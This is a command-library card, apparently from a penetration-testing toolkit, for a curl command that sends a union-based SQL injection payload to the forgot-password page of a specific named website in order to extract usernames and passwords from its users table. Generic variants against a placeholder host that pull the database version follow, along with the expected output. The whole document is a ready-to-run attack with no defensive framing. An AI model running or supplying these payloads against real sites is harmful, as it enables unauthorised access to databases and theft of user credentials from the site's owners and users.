---
id: cmd-uuid-004
data: >-
  curl -X POST https://gmmovinparts.com/forgot_password.jsp -d "email=admin'
  UNION SELECT 1,username,password FROM users--" -v
tags:
  - sqli
  - manual
  - web
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:20.484Z'
verified: false
validated: true
submitted: true
---
# curl-union-payload

## Command

```bash
curl -X POST https://gmmovinparts.com/forgot_password.jsp -d "email=admin' UNION SELECT 1,username,password FROM users--" -v
```

## Description

Manually injects a union-based SQL payload to extract data from a specific table, bypassing filters in web applications.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | HTTP method | Yes |
| `-d` | Payload data | Yes |
| `-v` | Verbose | No |

## Examples

### Basic Usage

```bash
curl -X POST https://target.com/endpoint -d "param=' UNION SELECT 1,2--" -v
```

### Advanced Usage

```bash
curl -X POST https://target.com/endpoint -d "email= UNION SELECT null,@@version--" -v
```

## Expected Output

Response body with injected data, e.g., database version or user records in the HTML.

## Related

- [[Related Procedure: Inject-SQL-Payload-to-Extract-Data]]
